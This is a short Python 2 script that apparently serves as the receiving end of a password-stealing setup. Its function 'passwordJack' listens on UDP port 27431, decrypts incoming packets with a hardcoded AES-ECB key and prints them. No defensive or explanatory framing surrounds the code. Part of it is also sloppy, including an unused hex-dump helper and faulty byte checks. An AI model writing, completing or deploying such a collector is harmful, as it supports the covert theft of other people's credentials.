#!/usr/bin/python
import os, re, socket, IPython, time, select
from Crypto.Cipher import AES
from IPython import embed;
from socket import *

KEY = "fdsl;mewrjope456fds4fbvfnjwaugfo"

def stdout (t, m):
        if (t is "+"):
                print "\x1b[32;1m[+]\x1b[0m\t" + m + "\n",
        elif (t is "-"):
                print "\x1b[31;1m[-]\x1b[0m\t" + m + "\n",
        elif (t is "*"):
                print "\x1b[34;1m[*]\x1b[0m\t" + m + "\n",
        elif (t is "!"):
                print "\x1b[33;1m[!]\x1b[0m\t" + m + "\n",

def sanitizeByte (byte):
	if byte == '0x0':
		return '0'
	elif 30 > ord(byte) or ord(byte) > 128:
		return '.'
	elif 30 < ord(byte) or ord(byte) < 128:
		return byte

def createDump (data):
        dump, by, hx, temp = '', [], [], ''
        unprint = list(data)
        for el in unprint:
                hx.append(el.encode("hex"))
                by.append(sanitizeByte(el))
        i = 0
        while i < len(hx):
                if (len(hx) - i ) >= 16:
                        dump += ' '.join(hx[i:i+16])
                        dump += "         "
                        dump += ' '.join(by[i:i+16])
                        dump += "\n"
                        i = i + 16
                else:
                        dump += ' '.join(hx[i:(len(hx) - 1)])
                        pad = len(' '.join(hx[i:(len(hx) - 1)]))
                        dump += ' ' * (56 - pad)
                        dump += ' '.join(by[i:(len(hx) - 1)])
                        dump += "\n"
                        i = i + len(hx)
        return dump

def passwordJack():
	key = AES.new(KEY, AES.MODE_ECB, )
	s = socket(AF_INET, SOCK_DGRAM)
	s.bind(('', 27431))
	s.setblocking(0)
	while True:
	    ret = select.select([s],[],[])
	    m = ret[0][0].recv(1024) 
	    stdout("+","\n" + key.decrypt(m))

passwordJack()
